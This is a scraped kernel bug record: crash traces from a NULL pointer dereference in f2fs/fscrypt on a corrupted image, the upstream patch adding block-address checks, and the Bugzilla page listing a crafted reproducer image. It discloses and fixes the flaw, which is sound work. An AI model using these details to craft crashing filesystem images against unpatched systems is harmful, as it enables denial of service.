[ 846.431462] walk\_component+0x1c6/0x470
[ 846.431479] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.431488] ? page\_add\_file\_rmap+0x13/0x200
[ 846.431491] path\_lookupat+0x76/0x230
[ 846.431501] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.431504] filename\_lookup+0xb8/0x1a0
[ 846.431534] ? \_cond\_resched+0x16/0x40
[ 846.431541] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.431549] ? path\_listxattr+0x41/0xa0
[ 846.431551] path\_listxattr+0x41/0xa0
[ 846.431570] do\_syscall\_64+0x55/0x100
[ 846.431583] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.431607] RIP: 0033:0x7f882de1c0d7
[ 846.431607] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.431639] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.431641] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.431642] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.431643] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.431645] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.431646] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.431648] ---[ end trace abca54df39d14f5c ]---
[ 846.431651] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix.
[ 846.431762] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs\_iget+0xd17/0xe70
[ 846.431763] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.431797] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.431798] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.431800] RIP: 0010:f2fs\_iget+0xd17/0xe70
[ 846.431801] Code: ff ff 48 63 d8 e9 e1 f6 ff ff 48 8b 45 c8 41 b8 05 00 00 00 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b 48 8b 38 e8 f9 b4 00 00 <0f> 0b 48 8b 45 c8 f0 80 48 48 04 e9 d8 f9 ff ff 0f 0b 48 8b 43 18
[ 846.431832] RSP: 0018:ffff961c414a7bd0 EFLAGS: 00010282
[ 846.431834] RAX: 0000000000000000 RBX: ffffc5f787b8ea80 RCX: 0000000000000006
[ 846.431835] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0
[ 846.431836] RBP: ffff961c414a7c20 R08: 0000000000000000 R09: 0000000000000273
[ 846.431837] R10: 0000000000000000 R11: ffff89dfad50ca60 R12: 0000000000000007
[ 846.431838] R13: ffff89dff5492800 R14: ffff89dfae3aa000 R15: ffff89dff4ff88d0
[ 846.431840] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.431841] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.431842] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.431846] Call Trace:
[ 846.431850] ? f2fs\_find\_entry+0x71/0x90
[ 846.431853] f2fs\_lookup+0x1aa/0x390
[ 846.431856] \_\_lookup\_slow+0x97/0x150
[ 846.431858] lookup\_slow+0x35/0x50
[ 846.431874] walk\_component+0x1c6/0x470
[ 846.431878] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.431880] ? page\_add\_file\_rmap+0x13/0x200
[ 846.431882] path\_lookupat+0x76/0x230
[ 846.431884] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.431886] filename\_lookup+0xb8/0x1a0
[ 846.431890] ? \_cond\_resched+0x16/0x40
[ 846.431891] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.431894] ? path\_listxattr+0x41/0xa0
[ 846.431896] path\_listxattr+0x41/0xa0
[ 846.431898] do\_syscall\_64+0x55/0x100
[ 846.431901] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.431902] RIP: 0033:0x7f882de1c0d7
[ 846.431903] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.431934] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.431936] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.431937] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.431939] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.431940] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.431941] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.431943] ---[ end trace abca54df39d14f5d ]---
[ 846.432033] F2FS-fs (loop0): access invalid blkaddr:1024
[ 846.432051] WARNING: CPU: 1 PID: 1249 at fs/f2fs/checkpoint.c:154 f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.432051] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.432085] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.432086] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.432089] RIP: 0010:f2fs\_is\_valid\_blkaddr+0x10f/0x160
[ 846.432089] Code: 00 eb ed 31 c0 83 fa 05 75 ae 48 83 ec 08 48 8b 3f 89 f1 48 c7 c2 fc 0b 0f 8b 48 c7 c6 8b d7 09 8b 88 44 24 07 e8 61 8b ff ff <0f> 0b 0f b6 44 24 07 48 83 c4 08 eb 81 4c 8b 47 10 8b 8f 38 04 00
[ 846.432120] RSP: 0018:ffff961c414a7900 EFLAGS: 00010286
[ 846.432122] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006
[ 846.432123] RDX: 0000000000000000 RSI: 0000000000000096 RDI: ffff89dfffd165d0
[ 846.432124] RBP: ffff89dff5492800 R08: 0000000000000001 R09: 000000000000029d
[ 846.432125] R10: ffff961c414a7820 R11: 000000000000029d R12: 0000000000000400
[ 846.432126] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000
[ 846.432128] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.432130] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.432131] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.432135] Call Trace:
[ 846.432151] f2fs\_wait\_on\_block\_writeback+0x20/0x110
[ 846.432158] f2fs\_grab\_read\_bio+0xbc/0xe0
[ 846.432161] f2fs\_submit\_page\_read+0x21/0x280
[ 846.432163] f2fs\_get\_read\_data\_page+0xb7/0x3c0
[ 846.432165] f2fs\_get\_lock\_data\_page+0x29/0x1e0
[ 846.432167] f2fs\_get\_new\_data\_page+0x148/0x550
[ 846.432170] f2fs\_add\_regular\_entry+0x1d2/0x550
[ 846.432178] ? \_\_switch\_to+0x12f/0x460
[ 846.432181] f2fs\_add\_dentry+0x6a/0xd0
[ 846.432184] f2fs\_do\_add\_link+0xe9/0x140
[ 846.432186] \_\_recover\_dot\_dentries+0x260/0x280
[ 846.432189] f2fs\_lookup+0x343/0x390
[ 846.432193] \_\_lookup\_slow+0x97/0x150
[ 846.432195] lookup\_slow+0x35/0x50
[ 846.432208] walk\_component+0x1c6/0x470
[ 846.432212] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.432215] ? page\_add\_file\_rmap+0x13/0x200
[ 846.432217] path\_lookupat+0x76/0x230
[ 846.432219] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.432221] filename\_lookup+0xb8/0x1a0
[ 846.432224] ? \_cond\_resched+0x16/0x40
[ 846.432226] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.432228] ? path\_listxattr+0x41/0xa0
[ 846.432230] path\_listxattr+0x41/0xa0
[ 846.432233] do\_syscall\_64+0x55/0x100
[ 846.432235] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.432237] RIP: 0033:0x7f882de1c0d7
[ 846.432237] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.432269] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.432271] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.432272] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.432273] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.432274] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.432275] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.432277] ---[ end trace abca54df39d14f5e ]---
[ 846.432279] F2FS-fs (loop0): invalid blkaddr: 1024, type: 5, run fsck to fix.
[ 846.432376] WARNING: CPU: 1 PID: 1249 at fs/f2fs/f2fs.h:2697 f2fs\_wait\_on\_block\_writeback+0xb1/0x110
[ 846.432376] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.432410] CPU: 1 PID: 1249 Comm: a.out Tainted: G W 4.18.0-rc3+ #1
[ 846.432411] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.432413] RIP: 0010:f2fs\_wait\_on\_block\_writeback+0xb1/0x110
[ 846.432414] Code: 66 90 f0 ff 4b 34 74 59 5b 5d c3 48 8b 7d 00 41 b8 05 00 00 00 89 d9 48 c7 c2 d8 e8 0e 8b 48 c7 c6 1d b0 0a 8b e8 df bc fd ff <0f> 0b f0 80 4d 48 04 e9 67 ff ff ff 48 8b 03 48 c1 e8 37 83 e0 07
[ 846.432445] RSP: 0018:ffff961c414a7910 EFLAGS: 00010286
[ 846.432447] RAX: 0000000000000000 RBX: 0000000000000400 RCX: 0000000000000006
[ 846.432448] RDX: 0000000000000000 RSI: 0000000000000092 RDI: ffff89dfffd165d0
[ 846.432449] RBP: ffff89dff5492800 R08: 0000000000000000 R09: 00000000000002d1
[ 846.432450] R10: ffff961c414a7820 R11: ffff89dfad50cf80 R12: 0000000000000400
[ 846.432451] R13: 0000000000000000 R14: ffff89dff4ff88d0 R15: 0000000000000000
[ 846.432453] FS: 00007f882e2fb700(0000) GS:ffff89dfffd00000(0000) knlGS:0000000000000000
[ 846.432454] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.432455] CR2: 0000000001a88008 CR3: 00000001eb572000 CR4: 00000000000006e0
[ 846.432459] Call Trace:
[ 846.432463] f2fs\_grab\_read\_bio+0xbc/0xe0
[ 846.432464] f2fs\_submit\_page\_read+0x21/0x280
[ 846.432466] f2fs\_get\_read\_data\_page+0xb7/0x3c0
[ 846.432468] f2fs\_get\_lock\_data\_page+0x29/0x1e0
[ 846.432470] f2fs\_get\_new\_data\_page+0x148/0x550
[ 846.432473] f2fs\_add\_regular\_entry+0x1d2/0x550
[ 846.432475] ? \_\_switch\_to+0x12f/0x460
[ 846.432477] f2fs\_add\_dentry+0x6a/0xd0
[ 846.432480] f2fs\_do\_add\_link+0xe9/0x140
[ 846.432483] \_\_recover\_dot\_dentries+0x260/0x280
[ 846.432485] f2fs\_lookup+0x343/0x390
[ 846.432488] \_\_lookup\_slow+0x97/0x150
[ 846.432490] lookup\_slow+0x35/0x50
[ 846.432505] walk\_component+0x1c6/0x470
[ 846.432509] ? memcg\_kmem\_charge\_memcg+0x70/0x90
[ 846.432511] ? page\_add\_file\_rmap+0x13/0x200
[ 846.432513] path\_lookupat+0x76/0x230
[ 846.432515] ? \_\_alloc\_pages\_nodemask+0xfc/0x280
[ 846.432517] filename\_lookup+0xb8/0x1a0
[ 846.432520] ? \_cond\_resched+0x16/0x40
[ 846.432522] ? kmem\_cache\_alloc+0x160/0x1d0
[ 846.432525] ? path\_listxattr+0x41/0xa0
[ 846.432526] path\_listxattr+0x41/0xa0
[ 846.432529] do\_syscall\_64+0x55/0x100
[ 846.432531] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 846.432533] RIP: 0033:0x7f882de1c0d7
[ 846.432533] Code: f0 ff ff 73 01 c3 48 8b 0d be dd 2b 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 b8 c2 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 dd 2b 00 f7 d8 64 89 01 48
[ 846.432565] RSP: 002b:00007ffe8e66c238 EFLAGS: 00000202 ORIG\_RAX: 00000000000000c2
[ 846.432567] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f882de1c0d7
[ 846.432568] RDX: 0000000000000071 RSI: 00007ffe8e66c280 RDI: 0000000001a880c0
[ 846.432569] RBP: 00007ffe8e66c300 R08: 0000000001a88010 R09: 0000000000000000
[ 846.432570] R10: 00000000000001ab R11: 0000000000000202 R12: 0000000000400550
[ 846.432571] R13: 00007ffe8e66c400 R14: 0000000000000000 R15: 0000000000000000
[ 846.432573] ---[ end trace abca54df39d14f5f ]---
[ 846.434280] BUG: unable to handle kernel NULL pointer dereference at 0000000000000008
[ 846.434424] PGD 80000001ebd3a067 P4D 80000001ebd3a067 PUD 1eb1ae067 PMD 0
[ 846.434551] Oops: 0000 [#1] SMP PTI
[ 846.434697] CPU: 0 PID: 44 Comm: kworker/u5:0 Tainted: G W 4.18.0-rc3+ #1
[ 846.434805] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
[ 846.435000] Workqueue: fscrypt\_read\_queue decrypt\_work
[ 846.435174] RIP: 0010:fscrypt\_do\_page\_crypto+0x6e/0x2d0
[ 846.435351] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24
[ 846.435696] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206
[ 846.435870] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80
[ 846.436051] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8
[ 846.436261] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000
[ 846.436433] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80
[ 846.436562] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60
[ 846.436658] FS: 0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000
[ 846.436758] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.436898] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0
[ 846.437001] Call Trace:
[ 846.437181] ? check\_preempt\_wakeup+0xf2/0x230
[ 846.437276] ? check\_preempt\_curr+0x7c/0x90
[ 846.437370] fscrypt\_decrypt\_page+0x48/0x4d
[ 846.437466] \_\_fscrypt\_decrypt\_bio+0x5b/0x90
[ 846.437542] decrypt\_work+0x12/0x20
[ 846.437651] process\_one\_work+0x15e/0x3d0
[ 846.437740] worker\_thread+0x4c/0x440
[ 846.437848] kthread+0xf8/0x130
[ 846.437938] ? rescuer\_thread+0x350/0x350
[ 846.438022] ? kthread\_associate\_blkcg+0x90/0x90
[ 846.438117] ret\_from\_fork+0x35/0x40
[ 846.438201] Modules linked in: snd\_hda\_codec\_generic snd\_hda\_intel snd\_hda\_codec snd\_hda\_core snd\_hwdep snd\_pcm snd\_timer snd input\_leds joydev soundcore serio\_raw i2c\_piix4 mac\_hid ib\_iser rdma\_cm iw\_cm ib\_cm ib\_core configfs iscsi\_tcp libiscsi\_tcp libiscsi scsi\_transport\_iscsi autofs4 raid10 raid456 libcrc32c async\_raid6\_recov async\_memcpy async\_pq async\_xor xor async\_tx raid6\_pq raid1 raid0 multipath linear qxl ttm crct10dif\_pclmul crc32\_pclmul drm\_kms\_helper ghash\_clmulni\_intel syscopyarea sysfillrect sysimgblt fb\_sys\_fops pcbc drm 8139too aesni\_intel 8139cp floppy psmouse mii aes\_x86\_64 crypto\_simd pata\_acpi cryptd glue\_helper
[ 846.438653] CR2: 0000000000000008
[ 846.438713] ---[ end trace abca54df39d14f60 ]---
[ 846.438796] RIP: 0010:fscrypt\_do\_page\_crypto+0x6e/0x2d0
[ 846.438844] Code: 00 65 48 8b 04 25 28 00 00 00 48 89 84 24 88 00 00 00 31 c0 e8 43 c2 e0 ff 49 8b 86 48 02 00 00 85 ed c7 44 24 70 00 00 00 00 <48> 8b 58 08 0f 84 14 02 00 00 48 8b 78 10 48 8b 0c 24 48 c7 84 24
[ 846.439084] RSP: 0018:ffff961c40f9bd60 EFLAGS: 00010206
[ 846.439176] RAX: 0000000000000000 RBX: ffffc5f787719b80 RCX: ffffc5f787719b80
[ 846.440927] RDX: ffffffff8b9f4b88 RSI: ffffffff8b0ae622 RDI: ffff961c40f9bdb8
[ 846.442083] RBP: 0000000000001000 R08: ffffc5f787719b80 R09: 0000000000001000
[ 846.443284] R10: 0000000000000018 R11: fefefefefefefeff R12: ffffc5f787719b80
[ 846.444448] R13: ffffc5f787719b80 R14: ffff89dff4ff88d0 R15: 0ffff89dfaddee60
[ 846.445558] FS: 0000000000000000(0000) GS:ffff89dfffc00000(0000) knlGS:0000000000000000
[ 846.446687] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 846.447796] CR2: 0000000000000008 CR3: 00000001eddd0000 CR4: 00000000000006f0
- Location
https://elixir.bootlin.com/linux/v4.18-rc4/source/fs/crypto/crypto.c#L149
struct crypto\_skcipher \*tfm = ci->ci\_ctfm;
Here ci can be NULL
Note that this issue maybe require CONFIG\_F2FS\_FS\_ENCRYPTION=y to reproduce.
Reported-by Wen Xu <wen.xu@gatech.edu>
Signed-off-by: Chao Yu <yuchao0@huawei.com>
Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=91291e9998d208370eb8156c760691b873bd7522)

| -rw-r--r-- | [fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/fs/f2fs/data.c?id=91291e9998d208370eb8156c760691b873bd7522) | 3 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |
| -rw-r--r-- | [fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/fs/f2fs/inode.c?id=91291e9998d208370eb8156c760691b873bd7522) | 18 | |  |  |  | | --- | --- | --- | |

2 files changed, 16 insertions, 5 deletions

| diff --git a/fs/f2fs/data.c b/fs/f2fs/data.cindex 363520ee099a1d..1e6cc68fb7c472 100644--- a/[fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/data.c?id=bcbfbd604dcba45246dd307c8317f216ada5567d)+++ b/[fs/f2fs/data.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/data.c?id=91291e9998d208370eb8156c760691b873bd7522)@@ -546,6 +546,9 @@ static struct bio \*f2fs\_grab\_read\_bio(struct inode \*inode, block\_t blkaddr, struct bio\_post\_read\_ctx \*ctx; unsigned int post\_read\_steps = 0; + if (!f2fs\_is\_valid\_blkaddr(sbi, blkaddr, DATA\_GENERIC))+ return ERR\_PTR(-EFAULT);+ bio = f2fs\_bio\_alloc(sbi, min\_t(int, nr\_pages, BIO\_MAX\_PAGES), false); if (!bio) return ERR\_PTR(-ENOMEM);diff --git a/fs/f2fs/inode.c b/fs/f2fs/inode.cindex aa343a5cab4455..fc2c98b9e255b4 100644--- a/[fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/inode.c?id=bcbfbd604dcba45246dd307c8317f216ada5567d)+++ b/[fs/f2fs/inode.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/f2fs/inode.c?id=91291e9998d208370eb8156c760691b873bd7522)@@ -68,14 +68,16 @@ static void \_\_get\_inode\_rdev(struct inode \*inode, struct f2fs\_inode \*ri) } } -static bool \_\_written\_first\_block(struct f2fs\_sb\_info \*sbi,+static int \_\_written\_first\_block(struct f2fs\_sb\_info \*sbi, struct f2fs\_inode \*ri) { block\_t addr = le32\_to\_cpu(ri->i\_addr[offset\_in\_addr(ri)]); - if (is\_valid\_data\_blkaddr(sbi, addr))- return true;- return false;+ if (!\_\_is\_valid\_data\_blkaddr(addr))+ return 1;+ if (!f2fs\_is\_valid\_blkaddr(sbi, addr, DATA\_GENERIC))+ return -EFAULT;+ return 0; }  static void \_\_set\_inode\_rdev(struct inode \*inode, struct f2fs\_inode \*ri)@@ -295,6 +297,7 @@ static int do\_read\_inode(struct inode \*inode) struct page \*node\_page; struct f2fs\_inode \*ri; projid\_t i\_projid;+ int err;  /\* Check if ino is within scope \*/ if (f2fs\_check\_nid\_range(sbi, inode->i\_ino))@@ -368,7 +371,12 @@ static int do\_read\_inode(struct inode \*inode) /\* get rdev by using inline\_info \*/ \_\_get\_inode\_rdev(inode, ri); - if (\_\_written\_first\_block(sbi, ri))+ err = \_\_written\_first\_block(sbi, ri);+ if (err < 0) {+ f2fs\_put\_page(node\_page, 1);+ return err;+ }+ if (!err) set\_inode\_flag(inode, FI\_FIRST\_BLOCK\_WRITTEN);  if (!f2fs\_need\_inode\_block\_update(sbi, inode->i\_ino)) |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-26 12:05:41 +0000



=== Content from bugzilla.kernel.org_61af5b47_20250125_213321.html ===


Kernel.org Bugzilla – Bug 200465
null ptr dereference in fscrypt\_do\_page\_crypto() when operating a file on a corrupted f2fs image
Last modified: 2018-09-21 01:41:40 UTC

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [Help](https://bugzilla.readthedocs.org/en/latest/using/understanding.html)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=200465&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](createaccount.cgi?request_new_password=1)
  Login:

  [x]

[**Bug 200465**](show_bug.cgi?id=200465)
- null ptr dereference in fscrypt\_do\_page\_crypto() when operating a file on a corrupted f2fs image

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
null ptr dereference in fscrypt\_do\_page\_crypto() when operating a file on a c...

| | [Status](page.cgi?id=fields.html#bug_status): | NEEDINFO | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | File System | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=File System "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | f2fs ([show other bugs](buglist.cgi?component=f2fs&product=File%20System&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | P1 normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Default virtual assignee for f2fs | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2018-07-09 23:38 UTC by Wen Xu | | --- | --- | | Modified: | 2018-09-21 01:41 UTC ([History](show_activity.cgi?id=200465)) | | CC List: | 3 users (show)  chao sbeattie wen.xu | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Kernel Version:](page.cgi?id=fields.html#cf_kernel_version "A custom Free Text field in this installation of Bugzilla.") | 4.18 | | [Subsystem:](page.cgi?id=fields.html#cf_subsystem "The subsystem responsible for this bug (must match MAINTAINERS entry verbatim)") |  | | [Regression:](page.cgi?id=fields.html#cf_regression "A custom Drop Down field in this installation of Bugzilla.") | No | | [Bisected commit-id:](page.cgi?id=fields.html#cf_bisect_commit "Full commit-id of the commit that introduced this regression.") |  | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**The (compressed) crafted image which causes crash**](attachment.cgi?id=277309 "View the content of the attachment") (65.85 KB, application/zip)  [2018-07-09 23:38 UTC](#attach_277309 "Go to the comment associated with the attachment"), Wen Xu | [Details](attachment.cgi?id=277309&action=edit) | | [Add an attachment](attachment.cgi?bugid=200465&action=enter) (proposed patch, testcase, etc.) | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

